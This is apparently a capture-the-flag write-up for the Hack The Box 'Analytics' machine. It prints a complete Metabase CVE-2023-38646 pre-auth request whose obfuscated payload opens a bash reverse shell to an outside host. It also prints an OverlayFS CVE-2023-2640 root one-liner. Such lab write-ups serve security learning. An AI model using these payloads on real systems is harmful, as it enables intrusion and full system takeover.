---
layout: page
title: Analytics
img: assets/img/writeups/hackthebox/Analytics/analytics_logo.png
importance: 1
category: hackthebox
---

## Foothold
Port scanning - 22, 80 (default)
{% include figure.html path="assets/img/writeups/hackthebox/Analytics/analytics_nmap.png" title="example image" class="img-fluid rounded z-depth-1" %}

Looking at SSH have no sense, our goal is web. Browser tells our target domain is analytical.htb - add that address to /etc/hosts config file. 

{% include figure.html path="assets/img/writeups/hackthebox/Analytics/analytics_site1.png" title="example image" class="img-fluid rounded z-depth-1" %}

Site contains no intersting things, but login button will trying redirect to data.analytics.htb. Add new note in /etc/hosts and it will meet Metabase - open source business-analytic tool.

Firstly, trying some googling to find exploits and CVEs of that application. Finally found a well-described page of [CVE-2023-38646](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/) from Assetnote.

## User
Let's skip the detailed description of CVE. Main moment is setup token that was not deleted. User able to use that token in some privileged actions.

Check if the setup-token in open access using a path /api/sessions/properties.

{% include figure.html path="assets/img/writeups/hackthebox/Analytics/analytics_setup_token.png" title="example image" class="img-fluid rounded z-depth-1" %}

Time to gain reverse shell via crafted request using that setup token.

```HTTP
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Content-Type: application/json
Referer: http://data.analytical.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
Content-Length: 821

{
        "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
        "details": {
            "is_on_demand": false,
            "is_full_sync": false,
            "is_sample": false,
            "refingerprint": false,
            "auto_run_queries": true,
            "schedules": {},
            "details": {
                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjYvOTAwMCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
                "advanced-options": false,
                "ssl": true
            },
            "name": "test",
            "engine": "h2"
        }
    }
```

Catching a shell, and it's a docker container.

{% include figure.html path="assets/img/writeups/hackthebox/Analytics/analytics_docker_shell.png" title="example image" class="img-fluid rounded z-depth-1" %}

Time to enumerate docker container, [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) can help in that process. 
There is a password for user metabase in enviroment variable.

{% include figure.html path="assets/img/writeups/hackthebox/Analytics/analytics_docker_var.png" title="example image" class="img-fluid rounded z-depth-1" %}

Connect via SSH to victim host with these credentials and get user.

{% include figure.html path="assets/img/writeups/hackthebox/Analytics/analytics_ssh.png" title="example image" class="img-fluid rounded z-depth-1" %}

## Root

Again enumeration linpeas gave nothing. Only a rabit hole.
Googling for new Privescs in linux in 2023 and it's [CVE-2023-2640](https://www.rapid7.com/db/vulnerabilities/ubuntu-cve-2023-2640/). 
Exploit for abusing overlayfs:

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"bash\")'";rm -rf l u w m
```

{% include figure.html path="assets/img/writeups/hackthebox/Analytics/analytics_root.png" title="example image" class="img-fluid rounded z-depth-1" %}